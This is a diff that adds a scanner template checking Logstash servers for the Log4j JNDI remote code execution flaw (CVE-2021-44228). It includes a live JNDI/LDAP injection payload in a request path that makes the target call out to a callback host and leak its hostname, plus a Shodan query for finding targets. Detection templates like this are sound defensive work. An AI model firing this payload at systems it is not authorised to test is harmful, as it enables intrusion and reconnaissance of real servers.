@@ -1,0 +1,64 @@
+id: logstash-log4j-rce
+
+info:
+  name: Logstash - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    Logstash is susceptible to Log4j JNDI remote code execution. Logstash is a free and open server-side data processing pipeline that ingests data from a multitude of sources, transforms it, and then sends it to your favorite "stash."
+  reference:
+    - https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+    cpe: cpe:2.3:a:elastic:logstash:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 1
+    shodan-query: html:"logstash"
+    product: logstash
+    vendor: elastic
+  tags: cve,cve2021,rce,jndi,log4j,logstash,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /api/logstash/pipeline/${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
+        Host: {{Hostname}}
+        Referrer: {{RootURL}}/app/management/ingest/pipelines/
+        Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip
+
+      - type: regex
+        part: interactsh_request
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+# digest: 4a0a00473045022100e465c0c186ae1ee3d099633eb90f17d1306098cd95625a73cb938d19fa347a2002203c2fd36437adb2cc218f12eb8fa4b68c7c96de51b0d3c6cd6c8003a44e58b2d3:922c64590222798bb761d5b6d8e72950
